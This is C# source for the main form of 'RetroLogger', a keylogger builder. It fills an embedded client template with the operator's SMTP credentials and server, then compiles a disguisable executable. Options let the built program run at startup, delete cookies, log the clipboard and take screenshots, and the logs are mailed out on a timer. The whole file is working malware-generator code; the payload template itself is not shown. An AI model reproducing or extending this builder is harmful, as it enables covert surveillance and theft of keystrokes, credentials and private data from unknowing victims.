using RetroLogger.Classes;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RetroLogger.Forms
{
    public partial class Main : Form
    {
        public Main()
        {
            InitializeComponent();
        }

        private void Main_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = MessageBox.Show("Are you sure to exit?", string.Empty, MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.No;
        }

        private void showPasswordCheckBox_CheckedChanged(object sender, EventArgs e)
        {
            passwordTextBox.UseSystemPasswordChar = !showPasswordCheckBox.Checked;
        }

        private void browseButton_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog() { Filter = "Icon File|*.ico" })
            {
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    iconPictureBox.Image = Image.FromFile(ofd.FileName);
                    iconPictureBox.Tag = ofd.FileName;
                }
            }
        }

        private void compileButton_Click(object sender, EventArgs e)
        {
            if (!validate())
            {
                MessageBox.Show("Inputs cannot be left empty.", string.Empty, MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            using (SaveFileDialog sfd = new SaveFileDialog() { Filter = "Executable File|*.exe" })
            {
                if (sfd.ShowDialog() == DialogResult.OK)
                {
                    string source = Properties.Resources.client;

                    source = source.Replace("%USERNAME%", usernameTextBox.Text);
                    source = source.Replace("%PASSWORD%", passwordTextBox.Text);
                    source = source.Replace("%SMTP%", smtpTextBox.Text);
                    source = source.Replace("25", portUpDown.Value.ToString());
                    source = source.Replace("1800000", (intervalUpDown.Value * 60000).ToString());

                    if (startupCheckBox.Checked)
                        source = source.Replace("_addToStartup = false", "_addToStartup = true");

                    if (deleteCookiesCheckBox.Checked)
                        source = source.Replace("_deleteCookies = false", "_deleteCookies = true");

                    if (showErrorCheckBox.Checked)
                        source = source.Replace("_showError = false", "_showError = true");

                    if (logClipboardCheckBox.Checked)
                        source = source.Replace("_logClipboard = false", "_logClipboard = true");

                    if (takeScreenshotCheckBox.Checked)
                        source = source.Replace("_takeScreenshot = false", "_takeScreenshot = true");

                    string iconPath = null;

                    if (iconPictureBox.Tag != null)
                        iconPath = iconPictureBox.Tag.ToString();

                    CompilerResults results = Compiler.compile(new string[] { source }, sfd.FileName, true, iconPath, new string[] { "System.dll", "System.Core.dll", "System.Drawing.dll", "System.Windows.Forms.dll" });

                    if (results.Errors.Count == 0)
                    {
                        MessageBox.Show("File has been generated successfully.", string.Empty, MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                    else
                    {
                        foreach (CompilerError error in results.Errors)
                            MessageBox.Show(error.ErrorText, string.Empty, MessageBoxButtons.OK, MessageBoxIcon.Error);

                        MessageBox.Show("File has failed to generate.", string.Empty, MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
        }

        private bool validate()
        {
            return !string.IsNullOrEmpty(usernameTextBox.Text) && !string.IsNullOrEmpty(passwordTextBox.Text) && !string.IsNullOrEmpty(smtpTextBox.Text);
        }
    }
}
